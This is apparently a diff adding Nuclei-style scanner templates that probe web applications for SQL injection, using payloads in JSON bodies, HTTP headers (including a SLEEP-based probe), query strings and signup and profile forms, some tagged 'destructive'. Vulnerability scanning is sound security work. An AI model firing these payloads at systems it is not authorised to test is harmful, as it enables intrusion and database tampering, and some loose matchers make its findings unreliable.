@@ -1,0 +1,186 @@
+id: sqli-json-injection
+info:
+  name: SQLi via JSON Body
+  author: AniipID
+  severity: critical
+  description: Detects SQL injection through JSON API request bodies
+  tags: sqli,json,api
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/query"
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/search"
+    body: '{"query":"SELECT * FROM users WHERE id = 1 OR 1=1"}'
+    headers:
+      Content-Type: "application/json"
+    matchers:
+      - type: word
+        words:
+          - "SELECT"
+          - "FROM"
+          - "WHERE"
+          - "mysql"
+          - "sql"
+        condition: or
+        name: "json-sql-reflection"
+---
+id: sqli-header-injection
+info:
+  name: SQLi via Headers
+  author: AniipID
+  severity: critical
+  description: Detects SQL injection through HTTP headers
+  tags: sqli,headers,blind
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/api"
+    headers:
+      X-Forwarded-For: "' OR '1'='1"
+      User-Agent: "' OR SLEEP(5)--"
+      Cookie: "session=' OR '1'='1'--"
+    matchers:
+      - type: word
+        words:
+          - "Warning:"
+          - "mysql_fetch"
+          - "SQL syntax"
+          - "unclosed quotation"
+          - "Incorrect syntax"
+        condition: or
+        name: "header-sqli"
+---
+id: sqli-order-by
+info:
+  name: SQLi ORDER BY Detection
+  author: AniipID
+  severity: high
+  description: Detects SQL injection using ORDER BY clause enumeration
+  tags: sqli,order-by,enumeration
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1+ORDER+BY+1"
+      - "{{BaseURL}}?id=1+ORDER+BY+2"
+      - "{{BaseURL}}?id=1+ORDER+BY+3"
+      - "{{BaseURL}}?id=1+ORDER+BY+4"
+      - "{{BaseURL}}?id=1+ORDER+BY+5"
+    matchers:
+      - type: word
+        words:
+          - "ORDER BY"
+          - "Unknown column"
+        condition: or
+        name: "order-by-reflected"
+---
+id: sqli-like-clause
+info:
+  name: SQLi LIKE Clause
+  author: AniipID
+  severity: high
+  description: Detects SQL injection using LIKE pattern matching
+  tags: sqli,like,blind
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1+AND+1=1+UNION+SELECT+1,2,3+LIKE+'%25'"
+      - "{{BaseURL}}?id=1+AND+'1'LIKE'1"
+      - "{{BaseURL}}?id=1+AND+'admin'LIKE'a%25"
+    matchers:
+      - type: word
+        words:
+          - "LIKE"
+          - "%"
+        condition: or
+        name: "like-reflected"
+---
+id: sqli-insert-injection
+info:
+  name: SQLi INSERT Injection
+  author: AniipID
+  severity: critical
+  description: Detects SQL injection in INSERT statements
+  tags: sqli,insert,destructive
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/register"
+      - "{{BaseURL}}/signup"
+      - "{{BaseURL}}/user/create"
+    body: "username=test'+AND+1=1--&password=test&email=test@test.com"
+    matchers:
+      - type: word
+        words:
+          - "Duplicate entry"
+          - "SQL syntax"
+          - "INSERT INTO"
+        condition: or
+        name: "insert-sqli"
+---
+id: sqli-update-injection
+info:
+  name: SQLi UPDATE Injection
+  author: AniipID
+  severity: critical
+  description: Detects SQL injection in UPDATE statements
+  tags: sqli,update,destructive
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/profile/update"
+      - "{{BaseURL}}/user/edit"
+    body: "email=test@test.com'+AND+1=1--&name=test"
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "UPDATE"
+          - "SET"
+        condition: or
+        name: "update-sqli"
+---
+id: sqli-having-clause
+info:
+  name: SQLi HAVING Clause
+  author: AniipID
+  severity: high
+  description: Detects SQL injection using HAVING clause for column enumeration
+  tags: sqli,having,enumeration
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1+HAVING+1=1"
+      - "{{BaseURL}}?id=1+GROUP+BY+1+HAVING+1=1"
+    matchers:
+      - type: word
+        words:
+          - "HAVING"
+          - "Column"
+        condition: or
+        name: "having-reflected"
+---
+id: sqli-comment-injection
+info:
+  name: SQLi Comment Injection
+  author: AniipID
+  severity: high
+  description: Detects SQL injection using various comment styles
+  tags: sqli,comment,bypass
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1'--+-"
+      - "{{BaseURL}}?id=1'/**/OR/**/1=1"
+      - "{{BaseURL}}?id=1'--"
+      - "{{BaseURL}}?id=1%23"
+      - "{{BaseURL}}?id=1'/*!*/"
+    matchers:
+      - type: word
+        words:
+          - "1'--"
+          - "1%23"
+          - "/**/"
+        condition: or
+        name: "comment-injection"
